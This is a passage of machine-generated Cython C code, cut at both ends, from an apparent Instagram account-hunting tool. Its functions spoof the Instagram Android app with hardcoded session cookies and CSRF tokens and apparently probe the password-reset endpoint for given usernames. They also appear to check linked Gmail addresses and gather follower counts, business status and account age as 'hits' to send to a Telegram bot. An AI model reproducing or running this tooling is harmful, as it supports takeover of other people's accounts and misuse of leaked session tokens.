  __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_o);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5rest(PyObject *__pyx_self, PyObject *__pyx_v_user); /*proto*/
static PyMethodDef __pyx_mdef_6source_5rest = {"rest", (PyCFunction)__pyx_pw_6source_5rest, METH_O, 0};
static PyObject *__pyx_pw_6source_5rest(PyObject *__pyx_self, PyObject *__pyx_v_user) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("rest (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_4rest(__pyx_self, ((PyObject *)__pyx_v_user));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_4rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user) {
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_r = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("rest", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 201, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Session_Id, __pyx_kp_u_50cc6861_7036_43b4_802e_fb428279) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_kp_u_1700251574_982) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Speed, __pyx_kp_u_1kbps) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_kp_u_1_000) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Bloks_Version_Id, __pyx_n_u_c80c5fb30dfae9e273e4009f03b18280) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Type, __pyx_n_u_WIFI) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Capabilities, __pyx_kp_u_3brTvw) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_App_ID, __pyx_kp_u_567067343352427) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_kp_u_Instagram_100_0_0_17_129_Android) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_en_GB_en_US) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Cookie, __pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Host, __pyx_kp_u_i_instagram_com) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_FB_HTTP_Engine, __pyx_n_u_Liger) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Connection, __pyx_kp_u_keep_alive) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Length, __pyx_kp_u_356) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      __pyx_v_headers = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = PyTuple_New(9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = 0;
      __pyx_t_7 = 127;
      __Pyx_INCREF(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240);
      __pyx_t_6 += 122;
      __Pyx_GIVEREF(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_0d067c2f86cac2c17d655631c9cec240);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u_guid);
      __pyx_t_6 += 10;
      __Pyx_GIVEREF(__pyx_kp_u_guid);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_guid);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u_device_id);
      __pyx_t_6 += 15;
      __Pyx_GIVEREF(__pyx_kp_u_device_id);
      PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u_device_id);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u_query);
      __pyx_t_6 += 11;
      __Pyx_GIVEREF(__pyx_kp_u_query);
      PyTuple_SET_ITEM(__pyx_t_5, 6, __pyx_kp_u_query);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 7, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u__19);
      __pyx_t_6 += 2;
      __Pyx_GIVEREF(__pyx_kp_u__19);
      PyTuple_SET_ITEM(__pyx_t_5, 8, __pyx_kp_u__19);
      __pyx_t_8 = __Pyx_PyUnicode_Join(__pyx_t_5, 9, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_signed_body, __pyx_t_8) < 0) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 221, __pyx_L3_error)
      __pyx_v_data = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 223, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_post); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 223, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __pyx_t_8 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 225, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 225, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 225, __pyx_L3_error)

      
      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__20, __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 223, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 226, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_4 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 226, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_v_response = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 227, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__21, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 227, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_r = __pyx_t_8;
      __pyx_t_8 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_10) {
      __Pyx_AddTraceback("source.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_4, &__pyx_t_9) < 0) __PYX_ERR(0, 228, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_INCREF(__pyx_t_4);
      __pyx_v_e = __pyx_t_4;
      /*try:*/ {

        
        __Pyx_INCREF(__pyx_kp_u_h);
        __Pyx_XDECREF_SET(__pyx_v_r, __pyx_kp_u_h);
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L15;
        }
        __pyx_L15:;
      }
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_r);
  __pyx_r = __pyx_v_r;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_AddTraceback("source.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_r);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7bunnyiginfo(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_7bunnyiginfo = {"bunnyiginfo", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_7bunnyiginfo, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_7bunnyiginfo(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_username = 0;
  CYTHON_UNUSED PyObject *__pyx_v_jj = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("bunnyiginfo (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_username,&__pyx_n_s_jj,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_username)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_jj)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("bunnyiginfo", 1, 2, 2, 1); __PYX_ERR(0, 233, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "bunnyiginfo") < 0)) __PYX_ERR(0, 233, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_username = values[0];
    __pyx_v_jj = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("bunnyiginfo", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 233, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.bunnyiginfo", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_6bunnyiginfo(__pyx_self, __pyx_v_username, __pyx_v_jj);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_6bunnyiginfo(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_username, CYTHON_UNUSED PyObject *__pyx_v_jj) {
  PyObject *__pyx_v_user_data = NULL;
  PyObject *__pyx_v_reset_value = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_is_business = NULL;
  PyObject *__pyx_v_followers = NULL;
  PyObject *__pyx_v_user_id = NULL;
  PyObject *__pyx_v_account_year = NULL;
  CYTHON_UNUSED int __pyx_v_send_to_bunny_only;
  PyObject *__pyx_v_header = NULL;
  PyObject *__pyx_v_hit_data = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_inline_keyboard = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_t_8;
  Py_ssize_t __pyx_t_9;
  Py_UCS4 __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("bunnyiginfo", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_InfoIG); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 236, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_Instagram_Info); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 236, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_v_username) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_v_username);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 236, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_user_data = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_RestInsta); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 237, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_Rest); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 237, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_v_username) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_username);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 237, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 237, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__22, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 237, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_reset_value = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_v_user_data); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 238, __pyx_L3_error)
      __pyx_t_8 = ((!__pyx_t_7) != 0);
      if (__pyx_t_8) {

        
        __Pyx_XDECREF(__pyx_r);
        __pyx_r = Py_None; __Pyx_INCREF(Py_None);
        goto __pyx_L7_try_return;

        
      }

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 241, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_ig_did, __pyx_kp_u_E50FABB9_2431_45C2_A804_50BB922F) < 0) __PYX_ERR(0, 241, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_csrftoken, __pyx_n_u_Gs5qTLrfajMdt0_4klliKd) < 0) __PYX_ERR(0, 241, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_datr, __pyx_n_u_B5_XZ1qXyHIoAhibTD6smK7K) < 0) __PYX_ERR(0, 241, __pyx_L3_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 245, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u__5) < 0) __PYX_ERR(0, 245, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 245, __pyx_L3_error)

      
      __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 247, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_9 = 0;
      __pyx_t_10 = 127;
      __Pyx_INCREF(__pyx_kp_u_https_www_instagram_com);
      __pyx_t_9 += 26;
      __Pyx_GIVEREF(__pyx_kp_u_https_www_instagram_com);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_https_www_instagram_com);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 247, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_10;
